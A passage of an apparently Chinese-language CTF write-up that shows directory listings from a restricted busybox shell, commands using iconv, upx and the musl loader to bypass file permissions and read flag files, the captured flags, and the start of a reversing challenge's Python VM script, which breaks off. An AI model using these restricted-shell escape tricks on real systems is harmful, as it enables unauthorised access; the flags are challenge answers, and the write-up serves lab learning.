acpid -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 adjtimex -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534       211304 Jan 10  2019 apk</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arp -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 blkid -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 blockdev -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 depmod -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fbsplash -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fdisk -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 findfs -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fsck -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fstrim -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 getty -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 halt -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hdparm -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hwclock -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifconfig -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifdown -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifenslave -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ifup -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 init -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 inotifyd -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 insmod -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ip -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipaddr -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iplink -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipneigh -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iproute -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iprule -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 iptunnel -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 klogd -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534          393 Mar 19  2019 ldconfig</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 loadkmap -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 logread -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 losetup -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsmod -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mdev -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkdosfs -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkfs.vfat -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534        13968 Jan 23  2019 mkmntdirs</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkswap -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 modinfo -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 modprobe -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nameif -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nologin -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 poweroff -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 raidautorun -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 reboot -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 rmmod -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 route -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setconsole -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 slattach -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 swapoff -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 swapon -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 switch_root -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sysctl -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 syslogd -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 tunctl -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 udhcpc -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 vconfig -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 watchdog -&gt; /bin/busybox</span><br><span class="line">&gt; total 1992</span><br><span class="line">drwxr-xr-x    2 65534    65534         4096 Jun 13 14:28 .</span><br><span class="line">drwxr-xr-x    8 65534    65534         4096 Jun 13 14:28 ..</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [ -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [[ -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 basename -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 beep -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 blkdiscard -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534        14208 Jan 29  2019 c_rehash</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cal -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chvt -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cksum -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 clear -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cpio -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 crontab -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 cryptpw -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dc -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 deallocvt -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dirname -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 dos2unix -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 du -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 eject -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 env -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 expr -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 factor -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fallocate -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 flock -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fold -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 free -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 fuser -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534        36728 Mar 19  2019 getconf</span><br><span class="line">-rwxr-xr-x    1 65534    65534        51912 Mar 19  2019 getent</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 groups -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 hostid -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534        25216 Mar 19  2019 iconv</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 id -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 install -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcrm -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ipcs -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 killall -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           29 May  9 20:49 ldd -&gt; ../../lib/ld-musl-x86_64.so.1</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 logger -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsof -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lsusb -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzcat -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzma -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 lzopcat -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 md5sum -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mesg -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 microcom -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkfifo -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 mkpasswd -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nmeter -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nohup -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nproc -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nsenter -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 nslookup -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 openvt -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 passwd -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 patch -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pgrep -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pkill -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pmap -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 printf -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pstree -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 pwdx -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 readlink -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 realpath -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 renice -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 reset -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 resize -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534        83744 Nov 15  2018 scanelf</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 seq -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setkeycodes -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 setsid -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha1sum -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha256sum -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha3sum -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sha512sum -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 showkey -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 shred -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 shuf -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 smemcap -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 split -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 sum -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 test -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 time -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 timeout -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 top -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 truncate -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 tty -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 ttysize -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 udhcpc6 -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unix2dos -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlink -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlzma -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unlzop -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unshare -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 unxz -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 uptime -&gt; /bin/busybox</span><br><span class="line">-rwxr-xr-x    1 65534    65534      1810232 Dec 28  2018 upx</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 vlock -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 volname -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 wc -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 which -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 whoami -&gt; /bin/busybox</span><br><span class="line">lrwxrwxrwx    1 65534    65534           12 May  9 20:49 yes -&gt; /bin/busybox</span><br><span class="line">&gt; total 24</span><br></pre></td></tr></table></figure><ul><li>iconv命令可以使用：iconv - convert text from one character encoding to another</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; iconv README.flag</span><br><span class="line">CTF&#123;4ll_D474_5h4ll_B3_Fr33&#125;</span><br><span class="line">&gt; iconv ORME.flag</span><br><span class="line">iconv: ORME.flag: Permission denied</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ul><li><p>可以看到README.flag文件中的flag</p></li><li><p>upx命令可用：upx - compress or expand executable files</p></li><li><p>利用upx从busybox提取chmod cat </p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; upx -o /tmp/chmod /bin/busybox</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    796240 -&gt;    451332   56.68%   linux/amd64   chmod</span><br><span class="line"></span><br><span class="line">Packed 1 file.</span><br><span class="line">&gt; upx -o /tmp/cat /bin/busybox</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    796240 -&gt;    451332   56.68%   linux/amd64   cat</span><br><span class="line"></span><br><span class="line">Packed 1 file.</span><br><span class="line"></span><br><span class="line">&gt; /tmp/chmod 777 ORME.flag README.flag</span><br><span class="line">&gt; ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwt    2 0        0               80 Sep 20 14:22 .</span><br><span class="line">drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..</span><br><span class="line">-rwxrwxrwx    1 1338     1338            33 Sep 20 14:22 ORME.flag</span><br><span class="line">-rwxrwxrwx    1 1338     1338            28 Sep 20 14:22 README.flag</span><br><span class="line"></span><br><span class="line">&gt; /tmp/cat ORME.flag README.flag</span><br><span class="line">CTF&#123;Th3r3_1s_4lw4y5_4N07h3r_W4y&#125;</span><br><span class="line">CTF&#123;4ll_D474_5h4ll_B3_Fr33&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ul><li>另一种思路：利用ld-musl-x86_64.so.1(/lib/ld-musl-x86_64.so.1 is in musl 0.9.15-1.This file is owned by root:root, with mode 0o777.It is a symlink to /lib/x86_64-linux-musl/libc.so)</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; /lib/ld-musl-x86_64.so.1 /bin/busybox chmod 777 ORME.flag README.flag</span><br><span class="line">&gt; ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwt    2 0        0               80 Sep 20 15:48 .</span><br><span class="line">drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..</span><br><span class="line">-rwxrwxrwx    1 1338     1338            33 Sep 20 15:48 ORME.flag</span><br><span class="line">-rwxrwxrwx    1 1338     1338            28 Sep 20 15:48 README.flag</span><br><span class="line">&gt; /lib/ld-musl-x86_64.so.1 /bin/busybox cat ORME.flag README.flag</span><br><span class="line">CTF&#123;Th3r3_1s_4lw4y5_4N07h3r_W4y&#125;</span><br><span class="line">CTF&#123;4ll_D474_5h4ll_B3_Fr33&#125;</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag:CTF{4ll_D474_5h4ll_B3_Fr33}</strong>==</li><li>==<strong>flag:CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}</strong>==</li></ul><h2 id="07-FriendSpaceBookPlusAllAccessRedPremium-com-reversing"><a href="#07-FriendSpaceBookPlusAllAccessRedPremium-com-reversing" class="headerlink" title="07 FriendSpaceBookPlusAllAccessRedPremium.com(reversing)"></a>07 FriendSpaceBookPlusAllAccessRedPremium.com(reversing)</h2><ul><li>解压得到：program  vm.py</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com</span><br><span class="line">╰─➤  file *                                                                                   06_FriendSpaceBookPlusAllAccessRedPremium.com.zip: Zip archive data, at least v2.0 to extract</span><br><span class="line">program:                                           UTF-8 Unicode text</span><br><span class="line">vm.py:                                             Python script, UTF-8 Unicode text executable</span><br></pre></td></tr></table></figure><ul><li>vm.py</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Implements a simple stack-based VM</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VM</span>:</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rom</span>):</span></span><br><span class="line">    self.rom = rom</span><br><span class="line">    self.accumulator1 = <span class="number">0</span></span><br><span class="line">    self.accumulator2 = <span class="number">0</span></span><br><span class="line">    self.instruction_pointer = <span class="number">1</span></span><br><span class="line">    self.stack = []</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">step</span>(<span class="params">self</span>):</span></span><br><span class="line">    cur_ins = self.rom[self.instruction_pointer]</span><br><span class="line">    self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    fn = VM.OPERATIONS.get(cur_ins, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cur_ins[<span class="number">0</span>] == <span class="string">&#x27;🖋&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> fn <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">      <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Unknown instruction &#x27;&#123;&#125;&#x27; at &#123;&#125;&quot;</span>.format(</span><br><span class="line">          repr(cur_ins), self.instruction_pointer - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      fn(self)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.stack.append(self.stack.pop() + self.stack.pop())</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">self</span>):</span></span><br><span class="line">    a = self.stack.pop()</span><br><span class="line">    b = self.stack.pop()</span><br><span class="line">    self.stack.append(b - a)</span><br><span 